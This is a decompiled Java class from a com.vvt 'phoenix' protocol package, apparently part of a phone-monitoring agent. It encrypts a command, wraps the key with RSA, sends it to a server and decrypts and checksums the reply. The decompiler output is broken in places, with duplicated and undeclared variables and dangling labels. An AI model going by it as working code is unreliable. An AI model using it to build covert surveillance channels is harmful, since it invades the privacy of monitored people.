package com.vvt.phoenix.prot;

import android.os.ConditionVariable;
import com.vvt.l.g;
import com.vvt.phoenix.prot.command.a.r;
import com.vvt.phoenix.prot.command.c;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.security.GeneralSecurityException;
import java.security.InvalidKeyException;
import java.security.interfaces.RSAPublicKey;
import javax.crypto.SecretKey;

public class i
{
  private static final boolean a;
  private com.vvt.phoenix.prot.b.a b;
  private String c;
  private r d;
  private ConditionVariable e;
  private com.vvt.http.a f;
  private byte[] g;
  private ByteArrayOutputStream h;
  private boolean i;
  private String j;
  
  static
  {
    boolean bool = com.vvt.phoenix.a.a;
    if (bool) {}
    for (bool = true;; bool = false)
    {
      a = bool;
      return;
    }
  }
  
  public i(com.vvt.phoenix.prot.b.a parama, String paramString)
  {
    this.b = parama;
    this.c = paramString;
    Object localObject = new com/vvt/phoenix/prot/command/a/r;
    ((r)localObject).<init>();
    this.d = ((r)localObject);
    localObject = new android/os/ConditionVariable;
    ((ConditionVariable)localObject).<init>();
    this.e = ((ConditionVariable)localObject);
    localObject = new com/vvt/http/a;
    ((com.vvt.http.a)localObject).<init>();
    this.f = ((com.vvt.http.a)localObject);
  }
  
  public r a()
  {
    k = 2;
    m = 1;
    n = 4;
    bool1 = a;
    if (bool1) {}
    Object localObject1 = new com/vvt/phoenix/prot/command/d;
    ((com.vvt.phoenix.prot.command.d)localObject1).<init>();
    localObject6 = this.b.d();
    ((com.vvt.phoenix.prot.command.d)localObject1).a((c)localObject6);
    i1 = (int)this.b.h();
    ((com.vvt.phoenix.prot.command.d)localObject1).b(i1);
    l1 = this.b.i();
    ((com.vvt.phoenix.prot.command.d)localObject1).a(l1);
    ((com.vvt.phoenix.prot.command.d)localObject1).a(n);
    localObject1 = com.vvt.phoenix.prot.a.e.a((com.vvt.phoenix.prot.command.d)localObject1);
    localObject6 = com.vvt.l.e.a(this.b.g());
    try
    {
      localObject1 = com.vvt.l.a.a((SecretKey)localObject6, (byte[])localObject1);
      if (localObject1 != null) {
        break label144;
      }
      bool1 = a;
      if (bool1) {}
      bool1 = false;
      localObject1 = null;
    }
    catch (GeneralSecurityException localGeneralSecurityException)
    {
      for (;;)
      {
        bool1 = false;
        Object localObject2 = null;
        continue;
        long l2 = com.vvt.k.a.a((byte[])localObject2);
        int i2 = localObject2.length;
        Object localObject7 = g.a(this.b.f());
        Object localObject9;
        int i5;
        try
        {
          Object localObject8 = this.b;
          localObject8 = ((com.vvt.phoenix.prot.b.a)localObject8).g();
          localObject7 = com.vvt.l.f.a((RSAPublicKey)localObject7, (byte[])localObject8);
          localObject8 = new java/io/ByteArrayOutputStream;
          ((ByteArrayOutputStream)localObject8).<init>();
          ((ByteArrayOutputStream)localObject8).write(m);
          long l3 = this.b.b();
          byte[] arrayOfByte1 = com.vvt.phoenix.a.a.a((int)l3);
          ((ByteArrayOutputStream)localObject8).write(arrayOfByte1, 0, n);
          arrayOfByte1 = com.vvt.phoenix.a.a.a((short)localObject7.length);
          ((ByteArrayOutputStream)localObject8).write(arrayOfByte1, 0, k);
          int i4 = localObject7.length;
          ((ByteArrayOutputStream)localObject8).write((byte[])localObject7, 0, i4);
          i2 = (short)i2;
          byte[] arrayOfByte2 = com.vvt.phoenix.a.a.a(i2);
          ((ByteArrayOutputStream)localObject8).write(arrayOfByte2, 0, k);
          localObject9 = com.vvt.phoenix.a.a.a((int)l2);
          ((ByteArrayOutputStream)localObject8).write((byte[])localObject9, 0, n);
          i5 = localObject2.length;
          ((ByteArrayOutputStream)localObject8).write((byte[])localObject2, 0, i5);
          localObject2 = ((ByteArrayOutputStream)localObject8).toByteArray();
          this.g = ((byte[])localObject2);
          com.vvt.io.d.a((OutputStream)localObject8);
          localObject2 = new com/vvt/phoenix/prot/k;
          ((k)localObject2).<init>(this, null);
          ((k)localObject2).setPriority(m);
          ((k)localObject2).start();
          localObject2 = this.e;
          l2 = 240000L;
          bool1 = ((ConditionVariable)localObject2).block(l2);
          if (bool1) {
            break label411;
          }
          this.e.close();
          bool1 = false;
          localObject2 = null;
        }
        catch (InvalidKeyException localInvalidKeyException)
        {
          bool1 = false;
          localObject3 = null;
        }
        continue;
        Object localObject3 = this.e;
        ((ConditionVariable)localObject3).close();
        bool1 = this.i;
        if (!bool1)
        {
          bool1 = a;
          if (bool1) {}
          bool1 = false;
          localObject3 = null;
        }
        else
        {
          localObject3 = new java/io/ByteArrayInputStream;
          localObject9 = this.h.toByteArray();
          ((ByteArrayInputStream)localObject3).<init>((byte[])localObject9);
          localObject9 = this.h;
          com.vvt.io.d.a((OutputStream)localObject9);
          i5 = ((ByteArrayInputStream)localObject3).read();
          if (i5 == m)
          {
            boolean bool2 = a;
            if (!bool2) {}
          }
          byte[] arrayOfByte3;
          Object localObject4;
          try
          {
            int i6 = ((ByteArrayInputStream)localObject3).available();
            localObject9 = new byte[i6];
            int i7 = 0;
            arrayOfByte3 = null;
            int i3 = localObject9.length;
            ((ByteArrayInputStream)localObject3).read((byte[])localObject9, 0, i3);
            com.vvt.io.d.a((InputStream)localObject3);
            localObject6 = com.vvt.l.a.b((SecretKey)localObject6, (byte[])localObject9);
            localObject3 = new java/io/ByteArrayInputStream;
            ((ByteArrayInputStream)localObject3).<init>((byte[])localObject6);
            i1 = 8;
            localObject6 = new byte[i1];
            Object tmp580_578 = localObject6;
            Object tmp581_580 = tmp580_578;
            Object tmp581_580 = tmp580_578;
            tmp581_580[0] = 0;
            tmp581_580[1] = 0;
            Object tmp588_581 = tmp581_580;
            Object tmp588_581 = tmp581_580;
            tmp588_581[2] = 0;
            tmp588_581[3] = 0;
            Object tmp595_588 = tmp588_581;
            Object tmp595_588 = tmp588_581;
            tmp595_588[4] = 0;
            tmp595_588[5] = 0;
            tmp595_588[6] = 0;
            tmp595_588[7] = 0;
            ((ByteArrayInputStream)localObject3).read((byte[])localObject6, n, n);
            l1 = com.vvt.phoenix.a.a.c((byte[])localObject6);
            i7 = ((ByteArrayInputStream)localObject3).available();
            arrayOfByte3 = new byte[i7];
            i3 = arrayOfByte3.length;
            ((ByteArrayInputStream)localObject3).read(arrayOfByte3, 0, i3);
            com.vvt.io.d.a((InputStream)localObject3);
            long l4 = com.vvt.k.a.a(arrayOfByte3);
            bool1 = a;
            if (bool1) {}
            bool1 = l1 < l4;
            if (!bool1) {
              break label730;
            }
            bool1 = a;
            if (bool1) {}
            bool1 = false;
            localObject3 = null;
          }
          catch (Exception localException)
          {
            bool1 = a;
            if (bool1) {}
            bool1 = false;
            localObject4 = null;
          }
          continue;
          bool1 = a;
          if (bool1) {}
          bool1 = true;
          try
          {
            localObject4 = com.vvt.phoenix.prot.a.f.a(arrayOfByte3, bool1);
            localObject4 = (r)localObject4;
            this.d = ((r)localObject4);
            localObject4 = this.d;
            localObject6 = this.b;
            l1 = ((com.vvt.phoenix.prot.b.a)localObject6).a();
            ((r)localObject4).b(l1);
            bool1 = a;
            if (bool1) {}
            localObject4 = this.d;
          }
          catch (IOException localIOException)
          {
            bool1 = a;
            if (bool1) {}
            bool1 = false;
            Object localObject5 = null;
          }
        }
      }
    }
    return (r)localObject1;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/phoenix/prot/i.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */